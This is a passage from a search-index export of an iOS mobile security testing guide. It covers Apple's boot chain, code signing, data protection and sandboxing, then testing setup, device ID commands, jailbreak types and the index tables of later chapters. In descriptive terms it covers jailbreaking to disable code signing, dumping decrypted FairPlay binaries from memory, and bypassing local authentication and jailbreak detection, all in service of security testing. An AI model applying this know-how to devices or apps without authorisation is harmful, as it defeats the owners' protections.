Next, the Boot ROM makes sure that the LLB's (Low Level Bootloader) signature is correct, and the LLB checks that the iBoot bootloader's signature is correct too. After the signature is validated, the iBoot checks the signature of the next boot stage, which is the iOS kernel. If any of these steps fail, the boot process will terminate immediately and the device will enter recovery mode and display the restore screen. However, if the Boot ROM fails to load, the device will enter a special low-level recovery mode called Device Firmware Upgrade (DFU). This is the last resort for restoring the device to its original state. In this mode, the device will show no sign of activity; i.e., its screen won't display anything.</p> <p>This entire process is called the \"Secure Boot Chain\". Its purpose is focused on verifying the boot process integrity, ensuring that the system and its components are written and distributed by Apple. The Secure Boot chain consists of the kernel, the bootloader, the kernel extension, and the baseband firmware.</p>","tags":[]},{"location":"MASTG/0x06a-Platform-Overview/#code-signing","title":"Code Signing","text":"<p>Apple has implemented an elaborate DRM system to make sure that only Apple-approved code runs on their devices, that is, code signed by Apple. In other words, you won't be able to run any code on an iOS device that hasn't been jailbroken unless Apple explicitly allows it. End users are supposed to install apps through the official Apple's App Store only. For this reason (and others), iOS has been compared to a crystal prison.</p> <p>A developer profile and an Apple-signed certificate are required to deploy and run an application. Developers need to register with Apple, join the Apple Developer Program and pay a yearly subscription to get the full range of development and deployment possibilities. There's also a free developer account that allows you to compile and deploy apps (but not distribute them in the App Store) via sideloading.</p> <p></p> <p>According to the Archived Apple Developer Documentation the code signature consists of three parts:</p> <ul> <li>A seal. This is a collection of checksums or hashes of the various parts of the code, created by the code signing software. The seal can be used at verification time to detect alterations.</li> <li>A digital signature. The code signing software encrypts the seal using the signer's identity to create a digital signature. This guarantees the seal's integrity.</li> <li>Code requirements. These are the rules governing verification of the code signature. Depending on the goals, some are inherent to the verifier, while others are specified by the signer and sealed with the rest of the code.</li> </ul> <p>Learn more:</p> <ul> <li>Code Signing Guide (Archived Apple Developer Documentation)</li> <li>Code Signing (Apple Developer Documentation)</li> <li>Demystifying iOS Code Signature</li> </ul>","tags":[]},{"location":"MASTG/0x06a-Platform-Overview/#encryption-and-data-protection","title":"Encryption and Data Protection","text":"<p>FairPlay Code Encryption is applied to apps downloaded from the App Store. FairPlay was developed as a DRM when purchasing multimedia content. Originally, FairPlay encryption was applied to MPEG and QuickTime streams, but the same basic concepts can also be applied to executable files. The basic idea is as follows: Once you register a new Apple user account, or Apple ID, a public/private key pair will be created and assigned to your account. The private key is securely stored on your device. This means that FairPlay-encrypted code can be decrypted only on devices associated with your account. Reverse FairPlay encryption is usually obtained by running the app on the device, then dumping the decrypted code from memory (see also \"Basic Security Testing on iOS\").</p> <p>Apple has built encryption into the hardware and firmware of its iOS devices since the release of the iPhone 3GS. Every device has a dedicated hardware-based cryptographic engine that provides an implementation of the AES 256-bit encryption and the SHA-1 hashing algorithms. In addition, there's a unique identifier (UID) built into each device's hardware with an AES 256-bit key fused into the Application Processor. This UID is unique and not recorded elsewhere. At the time of writing, neither software nor firmware can directly read the UID. Because the key is burned into the silicon chip, it can't be tampered with or bypassed. Only the crypto engine can access it.</p> <p>Building encryption into the physical architecture makes it a default security feature that can encrypt all data stored on an iOS device. As a result, data protection is implemented at the software level and works with the hardware and firmware encryption to provide more security.</p> <p>When data protection is enabled, by simply establishing a passcode in the mobile device, each data file is associated with a specific protection class. Each class supports a different level of accessibility and protects data on the basis of when the data needs to be accessed. The encryption and decryption operations associated with each class are based on multiple key mechanisms that utilize the device's UID and passcode, a class key, a file system key, and a per-file key. The per-file key is used to encrypt the file's contents. The class key is wrapped around the per-file key and stored in the file's metadata. The file system key is used to encrypt the metadata. The UID and passcode protect the class key. This operation is invisible to users. To enable data protection, the passcode must be used when accessing the device. The passcode unlocks the device. Combined with the UID, the passcode also creates iOS encryption keys that are more resistant to hacking and brute-force attacks. Enabling data protection is the main reason for users to use passcodes on their devices.</p>","tags":[]},{"location":"MASTG/0x06a-Platform-Overview/#sandbox","title":"Sandbox","text":"<p>The appsandbox is an iOS access control technology. It is enforced at the kernel level. Its purpose is limiting system and user data damage that may occur when an app is compromised.</p> <p>Sandboxing has been a core security feature since the first release of iOS. All third-party apps run under the same user (<code>mobile</code>), and only a few system applications and services run as <code>root</code> (or other specific system users). Regular iOS apps are confined to a container that restricts access to the app's own files and a very limited number of system APIs. Access to all resources (such as files, network sockets, IPCs, and shared memory) are controlled by the sandbox. These restrictions work as follows [#levin]:</p> <ul> <li>The app process is restricted to its own directory (under /var/mobile/Containers/ Bundle/Application/ or /var/containers/Bundle/Application/, depending on the iOS version) via a chroot-like process.</li> <li>The <code>mmap</code> and <code>mmprotect</code> system calls are modified to prevent apps from making writable memory pages executable and stopping processes from executing dynamically generated code. In combination with code signing and FairPlay, this strictly limits what code can run under specific circumstances (e.g., all code in apps distributed via the App Store is approved by Apple).</li> <li>Processes are isolated from each other, even if they are owned by the same UID at the operating system level.</li> <li>Hardware drivers can't be accessed directly. Instead, they must be accessed through Apple's public frameworks.</li> </ul>","tags":[]},{"location":"MASTG/0x06a-Platform-Overview/#general-exploit-mitigations","title":"General Exploit Mitigations","text":"<p>iOS implements address space layout randomization (ASLR) and eXecute Never (XN) bit to mitigate code execution attacks.</p> <p>ASLR randomizes the memory location of the program's executable file, data, heap, and stack every time the program is executed. Because the shared libraries must be static to be accessed by multiple processes, the addresses of shared libraries are randomized every time the OS boots instead of every time the program is invoked. This makes specific function and library memory addresses hard to predict, thereby preventing attacks such as the return-to-libc attack, which involves the memory addresses of basic libc functions.</p> <p>The XN mechanism allows iOS to mark selected memory segments of a process as non-executable. On iOS, the process stack and heap of user-mode processes is marked non-executable. Pages that are writable cannot be marked executable at the same time. This prevents attackers to execute machine code injected into the stack or heap.</p>","tags":[]},{"location":"MASTG/0x06a-Platform-Overview/#software-development-on-ios","title":"Software Development on iOS","text":"<p>Like other platforms, Apple provides a Software Development Kit (SDK) that helps developers to develop, install, run, and test native iOS Apps. Xcode is an Integrated Development Environment (IDE) for Apple software development. iOS applications are developed in Objective-C or Swift.</p> <p>Objective-C is an object-oriented programming language that adds Smalltalk-style messaging to the C programming language. It is used on macOS to develop desktop applications and on iOS to develop mobile applications. Swift is the successor of Objective-C and allows interoperability with Objective-C.</p> <p>Swift was introduced with Xcode 6 in 2014.</p> <p>On a non-jailbroken device, there are two ways to install an application out of the App Store:</p> <ol> <li>via Enterprise Mobile Device Management. This requires a company-wide certificate signed by Apple.</li> <li>via sideloading, i.e., by signing an app with a developer's certificate and installing it on the device via Xcode (or Cydia Impactor). A limited number of devices can be installed to with the same certificate.</li> </ol>","tags":[]},{"location":"MASTG/0x06a-Platform-Overview/#apps-on-ios","title":"Apps on iOS","text":"<p>iOS apps are distributed in IPA (iOS App Store Package) archives. The IPA file is a ZIP-compressed archive that contains all the code and resources required to execute the app.</p> <p>IPA files have a built-in directory structure. The example below shows this structure at a high level:</p> <ul> <li><code>/Payload/</code> folder contains all the application data. We will come back to the contents of this folder in more detail.</li> <li><code>/Payload/Application.app</code> contains the application data itself (ARM-compiled code) and associated static resources.</li> <li><code>/iTunesArtwork</code> is a 512x512 pixel PNG image used as the application's icon.</li> <li><code>/iTunesMetadata.plist</code> contains various bits of information, including the developer's name and ID, the bundle identifier, copyright information, genre, the name of the app, release date, purchase date, etc.</li> <li><code>/WatchKitSupport/WK</code> is an example of an extension bundle. This specific bundle contains the extension delegate and the controllers for managing the interfaces and responding to user interactions on an Apple Watch.</li> </ul>","tags":[]},{"location":"MASTG/0x06a-Platform-Overview/#ipa-payloads-a-closer-look","title":"IPA Payloads - A Closer Look","text":"<p>Let's take a closer look at the different files in the IPA container. Apple uses a relatively flat structure with few extraneous directories to save disk space and simplify file access. The top-level bundle directory contains the application's executable file and all the resources the application uses (for example, the application icon, other images, and localized content .</p> <ul> <li>MyApp: The executable file containing the compiled (unreadable) application source code.</li> <li>Application: Application icons.</li> <li>Info.plist: Configuration information, such as bundle ID, version number, and application display name.</li> <li>Launch images: Images showing the initial application interface in a specific orientation. The system uses one of the provided launch images as a temporary background until the application is fully loaded.</li> <li>MainWindow.nib: Default interface objects that are loaded when the application is launched. Other interface objects are then either loaded from other nib files or created programmatically by the application.</li> <li>Settings.bundle: Application-specific preferences to be displayed in the Settings app.</li> <li>Custom resource files: Non-localized resources are placed in the top-level directory and localized resources are placed in language-specific subdirectories of the application bundle. Resources include nib files, images, sound files, configuration files, strings files, and any other custom data files the application uses.</li> </ul> <p>A language.lproj folder exists for each language that the application supports. It contains a storyboard and strings file.</p> <ul> <li>A storyboard is a visual representation of the iOS application's user interface. It shows screens and the connections between those screens.</li> <li>The strings file format consists of one or more key-value pairs and optional comments.</li> </ul> <p></p> <p>On a jailbroken device, you can recover the IPA for an installed iOS app using different tools that allow decrypting the main app binary and reconstruct the IPA file. Similarly, on a jailbroken device you can install the IPA file with  ipainstaller. During mobile security assessments, developers often give you the IPA directly. They can send you the actual file or provide access to the development-specific distribution platform they use, e.g. TestFlight or Visual Studio App Center.</p>","tags":[]},{"location":"MASTG/0x06a-Platform-Overview/#app-permissions","title":"App Permissions","text":"<p>In contrast to Android apps (before Android 6.0 (API level 23)), iOS apps don't have pre-assigned permissions. Instead, the user is asked to grant permission during runtime, when the app attempts to use a sensitive API for the first time. Apps that have been granted permissions are listed in the Settings &gt; Privacy menu, allowing the user to modify the app-specific setting. Apple calls this permission concept privacy controls.</p> <p>iOS developers can't set requested permissions directly, these will be requested indirectly when accessing sensitive APIs. For example, when accessing a user's contacts, any call to CNContactStore blocks the app while the user is being asked to grant or deny access. Starting with iOS 10.0, apps must include usage description keys for the types of permissions they request and data they need to access (e.g., NSContactsUsageDescription).</p> <p>The following APIs require user permission:</p> <ul> <li>Contacts</li> <li>Microphone</li> <li>Calendars</li> <li>Camera</li> <li>Reminders</li> <li>HomeKit</li> <li>Photos</li> <li>Health</li> <li>Motion activity and fitness</li> <li>Speech recognition</li> <li>Location Services</li> <li>Bluetooth sharing</li> <li>Media Library</li> <li>Social media accounts</li> </ul>","tags":[]},{"location":"MASTG/0x06a-Platform-Overview/#devicecheck","title":"DeviceCheck","text":"<p>The DeviceCheck framework, including its components DeviceCheck and App Attest, helps you prevent fraudulent use of your services. It consists of a framework that you use from your app and an Apple server which is accessible only to your own server. DeviceCheck allows you to persistently store information on the device and on Apple servers. The stored information remains intact across app reinstallation, device transfers, or resets, with the option to reset this data periodically.</p> <p>DeviceCheck is typically used to mitigate fraud by restricting access to sensitive resources. For example, limiting promotions to once per device, identify and flag fraudulent devices, etc. However, it definitely cannot prevent all fraud. For example, it is not meant to detect compromised operating systems (aka. jailbreak detection).</p> <p>For more information, refer to the DeviceCheck documentation.</p>","tags":[]},{"location":"MASTG/0x06a-Platform-Overview/#app-attest","title":"App Attest","text":"<p>App Attest, available under the DeviceCheck framework, helps you verify instances of the app running on a device by enabling apps to attach a hardware-backed assertion to requests, ensuring they originate from the legitimate app on a genuine Apple device. This feature aids in preventing modified apps from communicating with your server.</p> <p>The process involves generating and validating cryptographic keys, along with a set of verifications performed by your server, ensuring the authenticity of the request. It is important to note that while App Attest enhances security, it does not guarantee complete protection against all forms of fraudulent activities.</p> <p>For more detailed information, refer to the WWDC 2021 session, along with the \"DeviceCheck documentation\" and \"Validating apps that connect to your server\".</p>","tags":[]},{"location":"MASTG/0x06b-iOS-Security-Testing/","title":"iOS Security Testing","text":"<p>In this chapter, we'll dive into setting up a security testing environment and introduce you to some practical processes and techniques for testing the security of iOS apps. These are the building blocks for the MASTG test cases.</p>","tags":[]},{"location":"MASTG/0x06b-iOS-Security-Testing/#ios-testing-setup","title":"iOS Testing Setup","text":"<p>Although you can use a Linux or Windows host computer for testing, you'll find that many tasks are difficult or impossible on these platforms. In addition, the Xcode development environment and the iOS SDK are only available for macOS. This means that you'll definitely want to work on macOS for source code analysis and debugging (it also makes black box testing easier).</p>","tags":[]},{"location":"MASTG/0x06b-iOS-Security-Testing/#host-device","title":"Host Device","text":"<p>The following is the most basic iOS app testing setup:</p> <ul> <li>Ideally macOS host computer with admin rights</li> <li> Xcode and  Xcode Command Line Tools installed.</li> <li>Wi-Fi network that permits client-to-client traffic.</li> <li>At least one jailbroken iOS device (of the desired iOS version).</li> <li> mitmproxy or other interception proxy tool.</li> </ul>","tags":[]},{"location":"MASTG/0x06b-iOS-Security-Testing/#obtaining-the-udid-of-an-ios-device","title":"Obtaining the UDID of an iOS device","text":"<p>The UDID is a 40-digit unique sequence of letters and numbers to identify an iOS device. You can find the UDID of your iOS device on macOS Catalina onwards in the Finder app, as iTunes is not available anymore in Catalina. Open Finder and select the connected iOS device in the sidebar.</p> <p></p> <p>Click on the text containing the model, storage capacity, and battery information, and it will display the serial number, UDID, and model instead:</p> <p></p> <p>You can copy the UDID by right clicking on it.</p> <p>It is also possible to get the UDID via various command line tools on macOS while the device is attached via USB:</p> <ul> <li> <p>By using the I/O Registry Explorer tool <code>ioreg</code>:</p> <pre><code>$ ioreg -p IOUSB -l | grep \"USB Serial\"\n|         \"USB Serial Number\" = \"9e8ada44246cee813e2f8c1407520bf2f84849ec\"\n</code></pre> </li> <li> <p>By using  libimobiledevice suite:</p> <pre><code>$ idevice_id -l\n316f01bd160932d2bf2f95f1f142bc29b1c62dbc\n</code></pre> </li> <li> <p>By using the system_profiler:</p> <pre><code>$ system_profiler SPUSBDataType | sed -n -e '/iPad/,/Serial/p;/iPhone/,/Serial/p;/iPod/,/Serial/p' | grep \"Serial Number:\"\n2019-09-08 10:18:03.920 system_profiler[13251:1050356] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be\n            Serial Number: 64655621de6ef5e56a874d63f1e1bdd14f7103b1\n</code></pre> </li> <li> <p>By using instruments:</p> <pre><code>instruments -s devices\n</code></pre> </li> </ul>","tags":[]},{"location":"MASTG/0x06b-iOS-Security-Testing/#testing-on-a-real-device-jailbroken","title":"Testing on a real device (Jailbroken)","text":"<p>You should have a jailbroken iPhone or iPad for running tests. These devices allow root access and tool installation, making the security testing process more straightforward. If you don't have access to a jailbroken device, you can apply the workarounds described later in this chapter, but be prepared for a more difficult experience.</p>","tags":[]},{"location":"MASTG/0x06b-iOS-Security-Testing/#testing-on-the-ios-simulator","title":"Testing on the iOS Simulator","text":"<p>Unlike the Android emulator, which fully emulates the hardware of an actual Android device, the iOS SDK simulator offers a higher-level simulation of an iOS device. Most importantly, emulator binaries are compiled to x86 code instead of ARM code. Apps compiled for a real device don't run, making the simulator useless for black box analysis and reverse engineering.</p>","tags":[]},{"location":"MASTG/0x06b-iOS-Security-Testing/#testing-on-an-emulator","title":"Testing on an Emulator","text":"<p> Corellium is the only publicly available iOS emulator. It is an enterprise SaaS solution with a per user license model and does not offer community licenses.</p>","tags":[]},{"location":"MASTG/0x06b-iOS-Security-Testing/#getting-privileged-access","title":"Getting Privileged Access","text":"<p>iOS jailbreaking is often compared to Android rooting, but the process is actually quite different. To explain the difference, we'll first review the concepts of \"rooting\" and \"flashing\" on Android.</p> <ul> <li>Rooting: This typically involves installing the <code>su</code> binary on the system or replacing the whole system with a rooted custom ROM. Exploits aren't required to obtain root access as long as the bootloader is accessible.</li> <li>Flashing custom ROMs: This allows you to replace the OS that's running on the device after you unlock the bootloader. The bootloader may require an exploit to unlock it.</li> </ul> <p>On iOS devices, flashing a custom ROM is impossible because the iOS bootloader only allows Apple-signed images to be booted and flashed. This is why even official iOS images can't be installed if they aren't signed by Apple, and it makes iOS downgrades only possible for as long as the previous iOS version is still signed.</p> <p>The purpose of jailbreaking is to disable iOS protections (Apple's code signing mechanisms in particular) so that arbitrary unsigned code can run on the device (e.g. custom code or downloaded from alternative app stores such as  Cydia or  Sileo). The word \"jailbreak\" is a colloquial reference to all-in-one tools that automate the disabling process.</p> <p>Developing a jailbreak for a given version of iOS is not easy. As a security tester, you'll most likely want to use publicly available jailbreak tools. Still, we recommend studying the techniques that have been used to jailbreak various versions of iOS-you'll encounter many interesting exploits and learn a lot about OS internals. For example, Pangu9 for iOS 9.x exploited at least five vulnerabilities, including a use-after-free kernel bug (CVE-2015-6794) and an arbitrary file system access vulnerability in the Photos app (CVE-2015-7037).</p> <p>Some apps attempt to detect whether the iOS device on which they're running is jailbroken. This is because jailbreaking deactivates some of iOS' default security mechanisms. However, there are several ways to get around these detections, and we'll introduce them in the chapter \"iOS Anti-Reversing Defenses\".</p>","tags":[]},{"location":"MASTG/0x06b-iOS-Security-Testing/#benefits-of-jailbreaking","title":"Benefits of Jailbreaking","text":"<p>End users often jailbreak their devices to tweak the iOS system's appearance, add new features, and install third-party apps from unofficial app stores. For a security tester, however, jailbreaking an iOS device has even more benefits. They include, but aren't limited to, the following:</p> <ul> <li>Root access to the file system.</li> <li>Possibility of executing applications that haven't been signed by Apple (which includes many security tools).</li> <li>Unrestricted debugging and dynamic analysis.</li> <li>Access to the Objective-C or Swift runtime.</li> </ul>","tags":[]},{"location":"MASTG/0x06b-iOS-Security-Testing/#jailbreak-types","title":"Jailbreak Types","text":"<p>There are tethered, semi-tethered, semi-untethered, and untethered jailbreaks.</p> <ul> <li> <p>Tethered jailbreaks don't persist through reboots, so re-applying jailbreaks requires the device to be connected (tethered) to a computer during every reboot. The device may not reboot at all if the computer is not connected.</p> </li> <li> <p>Semi-tethered jailbreaks can't be re-applied unless the device is connected to a computer during reboot. The device can also boot into non-jailbroken mode on its own.</p> </li> <li> <p>Semi-untethered jailbreaks allow the device to boot on its own, but the kernel patches (or user-land modifications) for disabling code signing aren't applied automatically. The user must re-jailbreak the device by starting an app or visiting a website (not requiring a connection to a computer, hence the term untethered).</p> </li> <li> <p>Untethered jailbreaks are the most popular choice for end users because they need to be applied only once, after which the device will be permanently jailbroken.</p> </li> </ul>","tags":[]},{"location":"MASTG/0x06b-iOS-Security-Testing/#caveats-and-considerations","title":"Caveats and Considerations","text":"<p>Developing a jailbreak for iOS is becoming more and more complicated as Apple continues to harden their OS. Whenever Apple becomes aware of a vulnerability, it is patched and a system update is pushed out to all users. As it is not possible to downgrade to a specific version of iOS, and since Apple only allows you to update to the latest iOS version, it is a challenge to have a device which is running a version of iOS for which a jailbreak is available. Some vulnerabilities cannot be patched by software, such as the checkm8 exploit affecting the BootROM of all CPUs until A12.</p> <p>If you have a jailbroken device that you use for security testing, keep it as is unless you're 100% sure that you can re-jailbreak it after upgrading to the latest iOS version. Consider getting one (or multiple) spare device(s) (which will be updated with every major iOS release) and waiting for a jailbreak to be released publicly. Apple is usually quick to release a patch once a jailbreak has been released publicly, so you only have a couple of days to downgrade (if it is still signed by Apple) to the affected iOS version and apply the jailbreak.</p> <p>iOS upgrades are based on a challenge-response process (generating the so-called SHSH blobs as a result). The device will allow the OS installation only if the response to the challenge is signed by Apple. This is what researchers call a \"signing window\", and it is the reason you can't simply store the OTA firmware package you downloaded and load it onto the device whenever you want to. During minor iOS upgrades, two versions may both be signed by Apple (the latest one, and the previous iOS version). This is the only situation in which you can downgrade the iOS device. You can check the current signing window and download OTA firmware from the IPSW Downloads website.</p> <p>For some devices and iOS versions, it is possible to downgrade to older versions in case the SHSH blobs for that device were collected when the signing window was active. More information on this can be found on the cfw iOS Guide - Saving Blobs</p>","tags":[]},{"location":"MASTG/0x06b-iOS-Security-Testing/#which-jailbreaking-tool-to-use","title":"Which Jailbreaking Tool to Use","text":"<p>Different iOS versions require different jailbreaking techniques. Determine whether a public jailbreak is available for your version of iOS. Beware of fake tools and spyware, which are often hiding behind domain names that are similar to the name of the jailbreaking group/author.</p> <p>The iOS jailbreak scene evolves so rapidly that providing up-to-date instructions is difficult. However, we can point you to some sources that are currently reliable.</p> <ul> <li>AppleDB</li> <li>The iPhone Wiki</li> <li>Redmond Pie</li> <li>Reddit Jailbreak</li> </ul> <p>Note that any modification you make to your device is at your own risk. While jailbreaking is typically safe, things can go wrong and you may end up bricking your device. No other party except yourself can be held accountable for any damage.</p>","tags":[]},{"location":"MASTG/0x06d-Testing-Data-Storage/","title":"iOS Data Storage","text":"","tags":["ios","MASVS-STORAGE"]},{"location":"MASTG/0x06d-Testing-Data-Storage/#overview","title":"Overview","text":"<p>The protection of sensitive data, such as authentication tokens and private information, is key for mobile security. In this chapter, you'll learn about the iOS APIs for local data storage, and best practices for using them.</p> <p>As little sensitive data as possible should be saved in permanent local storage. However, in most practical scenarios, at least some user data must be stored. Fortunately, iOS offers secure storage APIs, which allow developers to use the cryptographic hardware available on every iOS device. If these APIs are used correctly, sensitive data and files can be secured via hardware-backed 256-bit AES encryption.</p> <p></p>","tags":["ios","MASVS-STORAGE"]},{"location":"MASTG/0x06d-Testing-Data-Storage/#knowledge-articles","title":"Knowledge Articles","text":"ID Name Platform MASTG-KNOW-0099  Screenshots platform:ios MASTG-KNOW-0103  Process Memory platform:ios MASTG-KNOW-0104  Inter-Process Communication (IPC) Mechanisms platform:ios MASTG-KNOW-0100  Keyboard Cache platform:ios MASTG-KNOW-0092  Binary Data Storage platform:ios MASTG-KNOW-0096  Realm Databases platform:ios MASTG-KNOW-0095  Firebase Real-time Databases platform:ios MASTG-KNOW-0101  Logs platform:ios MASTG-KNOW-0091  File System APIs platform:ios MASTG-KNOW-0098  User Interface Components platform:ios MASTG-KNOW-0094  CoreData platform:ios MASTG-KNOW-0093  UserDefaults platform:ios MASTG-KNOW-0097  Other Third-Party Databases platform:ios MASTG-KNOW-0102  Backups platform:ios","tags":["ios","MASVS-STORAGE"]},{"location":"MASTG/0x06e-Testing-Cryptography/","title":"iOS Cryptographic APIs","text":"","tags":["ios","MASVS-CRYPTO"]},{"location":"MASTG/0x06e-Testing-Cryptography/#overview","title":"Overview","text":"<p>In the \"Mobile App Cryptography\" chapter, we introduced general cryptography best practices and described typical issues that can occur when cryptography is used incorrectly. In this chapter, we'll go into more detail on iOS's cryptography APIs. We'll show how to identify usage of those APIs in the source code and how to interpret cryptographic configurations. When reviewing code, make sure to compare the cryptographic parameters used with the current best practices linked from this guide.</p> <p>Apple provides libraries that include implementations of most common cryptographic algorithms. Apple's Cryptographic Services Guide is a great reference. It contains generalized documentation of how to use standard libraries to initialize and use cryptographic primitives, information that is useful for source code analysis.</p> <p></p>","tags":["ios","MASVS-CRYPTO"]},{"location":"MASTG/0x06e-Testing-Cryptography/#knowledge-articles","title":"Knowledge Articles","text":"ID Name Platform MASTG-KNOW-0067  CommonCrypto, SecKey and Wrapper libraries platform:ios MASTG-KNOW-0066  CryptoKit platform:ios MASTG-KNOW-0069  Key Management platform:ios MASTG-KNOW-0070  Random Number Generator platform:ios MASTG-KNOW-0068  Cryptographic Third-Party libraries platform:ios","tags":["ios","MASVS-CRYPTO"]},{"location":"MASTG/0x06f-Testing-Local-Authentication/","title":"iOS Local Authentication","text":"","tags":["ios","MASVS-AUTH"]},{"location":"MASTG/0x06f-Testing-Local-Authentication/#overview","title":"Overview","text":"<p>During local authentication, an app authenticates the user against credentials stored locally on the device. In other words, the user \"unlocks\" the app or some inner layer of functionality by providing a valid PIN, password or biometric characteristics such as face or fingerprint, which is verified by referencing local data. Generally, this is done so that users can more conveniently resume an existing session with a remote service or as a means of step-up authentication to protect some critical function.</p> <p>As stated before in chapter \"Mobile App Authentication Architectures\": The tester should be aware that local authentication should always be enforced at a remote endpoint or based on a cryptographic primitive. Attackers can easily bypass local authentication if no data returns from the authentication process.</p> <p>A variety of methods are available for integrating local authentication into apps. The Local Authentication framework provides a set of APIs for developers to extend an authentication dialog to a user. In the context of connecting to a remote service, it is possible (and recommended) to leverage the keychain for implementing local authentication.</p> <p>Fingerprint authentication on iOS is known as Touch ID. The fingerprint ID sensor is operated by the SecureEnclave security coprocessor and does not expose fingerprint data to any other parts of the system. Next to Touch ID, Apple introduced Face ID: which allows authentication based on facial recognition. Both use similar APIs on an application level, the actual method of storing the data and retrieving the data (e.g. facial data or fingerprint related data is different).</p> <p>Developers have two options for incorporating Touch ID/Face ID authentication:</p> <ul> <li><code>LocalAuthentication.framework</code> is a high-level API that can be used to authenticate the user via Touch ID. The app can't access any data associated with the enrolled fingerprint and is notified only whether authentication was successful.</li> <li><code>Security.framework</code> is a lower level API to access keychain services. This is a secure option if your app needs to protect some secret data with biometric authentication, since the access control is managed on a system-level and can not easily be bypassed. <code>Security.framework</code> has a C API, but there are several open source wrappers available, making access to the keychain as simple as to NSUserDefaults. <code>Security.framework</code> underlies <code>LocalAuthentication.framework</code>; Apple recommends to default to higher-level APIs whenever possible.</li> </ul> <p>Please be aware that using either the <code>LocalAuthentication.framework</code> or the <code>Security.framework</code>, will be a control that can be bypassed by an attacker as it does only return a boolean and no data to proceed with. See Don't touch me that way, by David Lindner et al for more details.</p> <p></p>","tags":["ios","MASVS-AUTH"]},{"location":"MASTG/0x06f-Testing-Local-Authentication/#knowledge-articles","title":"Knowledge Articles","text":"ID Name Platform MASTG-KNOW-0056  Local Authentication Framework platform:ios MASTG-KNOW-0057  Keychain Services platform:ios","tags":["ios","MASVS-AUTH"]},{"location":"MASTG/0x06g-Testing-Network-Communication/","title":"iOS Network Communication","text":"","tags":["ios","MASVS-NETWORK"]},{"location":"MASTG/0x06g-Testing-Network-Communication/#overview","title":"Overview","text":"<p>Almost every iOS app acts as a client to one or more remote services. As this network communication usually takes place over untrusted networks such as public Wi-Fi, classical network based-attacks become a potential issue.</p> <p>Most modern mobile apps use variants of HTTP-based web services, as these protocols are well-documented and supported.</p> <p></p>","tags":["ios","MASVS-NETWORK"]},{"location":"MASTG/0x06g-Testing-Network-Communication/#knowledge-articles","title":"Knowledge Articles","text":"ID Name Platform MASTG-KNOW-0072  Server Trust Evaluation platform:ios MASTG-KNOW-0071  iOS App Transport Security platform:ios MASTG-KNOW-0073  iOS Network APIs platform:ios","tags":["ios","MASVS-NETWORK"]},{"location":"MASTG/0x06h-Testing-Platform-Interaction/","title":"iOS Platform APIs","text":"","tags":["ios","MASVS-PLATFORM"]},{"location":"MASTG/0x06h-Testing-Platform-Interaction/#overview","title":"Overview","text":"","tags":["ios","MASVS-PLATFORM"]},{"location":"MASTG/0x06h-Testing-Platform-Interaction/#knowledge-articles","title":"Knowledge Articles","text":"ID Name Platform MASTG-KNOW-0080  Universal Links platform:ios MASTG-KNOW-0075  Object Serialization platform:ios MASTG-KNOW-0076  WebViews platform:ios MASTG-KNOW-0083  Pasteboard platform:ios MASTG-KNOW-0082  App extensions platform:ios MASTG-KNOW-0079  Custom URL Schemes platform:ios MASTG-KNOW-0081  UIActivity Sharing platform:ios MASTG-KNOW-0077  App Permissions platform:ios MASTG-KNOW-0078  Inter-Process Communication (IPC) platform:ios MASTG-KNOW-0074  Enforced Updating platform:ios","tags":["ios","MASVS-PLATFORM"]},{"location":"MASTG/0x06i-Testing-Code-Quality-and-Build-Settings/","title":"iOS Code Quality and Build Settings","text":"","tags":["ios","MASVS-CODE"]},{"location":"MASTG/0x06i-Testing-Code-Quality-and-Build-Settings/#overview","title":"Overview","text":"","tags":["ios","MASVS-CODE"]},{"location":"MASTG/0x06i-Testing-Code-Quality-and-Build-Settings/#knowledge-articles","title":"Knowledge Articles","text":"ID Name Platform MASTG-KNOW-0058  App Signing platform:ios MASTG-KNOW-0060  Memory Corruption Bugs platform:ios MASTG-KNOW-0059  Third-Party Libraries platform:ios MASTG-KNOW-0065  Exception Handling platform:ios MASTG-KNOW-0061  Binary Protection Mechanisms platform:ios MASTG-KNOW-0062  Debuggable Apps platform:ios MASTG-KNOW-0064  Debugging Code and Error Logging platform:ios MASTG-KNOW-0063  Debugging Symbols platform:ios","tags":["ios","MASVS-CODE"]},{"location":"MASTG/0x06j-Testing-Resiliency-Against-Reverse-Engineering/","title":"iOS Anti-Reversing Defenses","text":"","tags":["ios","MASVS-RESILIENCE"]},{"location":"MASTG/0x06j-Testing-Resiliency-Against-Reverse-Engineering/#overview","title":"Overview","text":"<p>This chapter covers defense-in-depth measures recommended for apps that process, or give access to, sensitive data or functionality. Research shows that many App Store apps often include these measures.</p> <p>These measures should be applied as needed, based on an assessment of the risks caused by unauthorized tampering with the app and/or reverse engineering of the code.</p> <ul> <li>Apps must never use these measures as a replacement for security controls, and are therefore expected to fulfill other baseline security measures such as the rest of the MASVS security controls.</li> <li>Apps should combine these measures cleverly instead of using them individually. The goal is to discourage reverse engineers from performing further analysis.</li> <li>Integrating some of the controls into your app might increase the complexity of your app and even have an impact on its performance.</li> </ul> <p>You can learn more about principles and technical risks of reverse engineering and code modification in these OWASP documents:</p> <ul> <li>OWASP Architectural Principles That Prevent Code Modification or Reverse Engineering</li> <li>OWASP Technical Risks of Reverse Engineering and Unauthorized Code Modification</li> </ul> <p>General Disclaimer:</p> <p>The lack of any of these measures does not cause a vulnerability - instead, they are meant to increase the app's resilience against reverse engineering and specific client-side attacks.</p> <p>None of these measures can assure a 100% effectiveness, as the reverse engineer will always have full access to the device and will therefore always win (given enough time and resources)!</p> <p>For example, preventing debugging is virtually impossible. If the app is publicly available, it can be run on an untrusted device that is under full control of the attacker. A very determined attacker will eventually manage to bypass all the app's anti-debugging controls by patching the app binary or by dynamically modifying the app's behavior at runtime with tools such as Frida.</p> <p>The techniques discussed below will allow you to detect various ways in which an attacker may target your app. Since these techniques are publicly documented, they are generally easy to bypass. Using open-source detection techniques is a good first step in improving the resiliency of your app, but standard anti-detection tools can easily bypass them. Commercial products typically offer higher resilience, as they will combine multiple techniques, such as:</p> <ul> <li>Using undocumented detection techniques</li> <li>Implementing the same techniques in various ways</li> <li>Triggering the detection logic in different scenarios</li> <li>Providing unique detection combinations per build</li> <li>Working together with a backend component for additional verification and HTTP payload encryption</li> <li>Communicating the detection status to the backend</li> <li>Advanced static obfuscation</li> </ul> <p></p>","tags":["ios","MASVS-RESILIENCE"]},{"location":"MASTG/0x06j-Testing-Resiliency-Against-Reverse-Engineering/#knowledge-articles","title":"Knowledge Articles","text":"ID Name Platform MASTG-KNOW-0090  Device Binding platform:ios MASTG-KNOW-0084  Jailbreak Detection platform:ios MASTG-KNOW-0086  File Integrity Checks 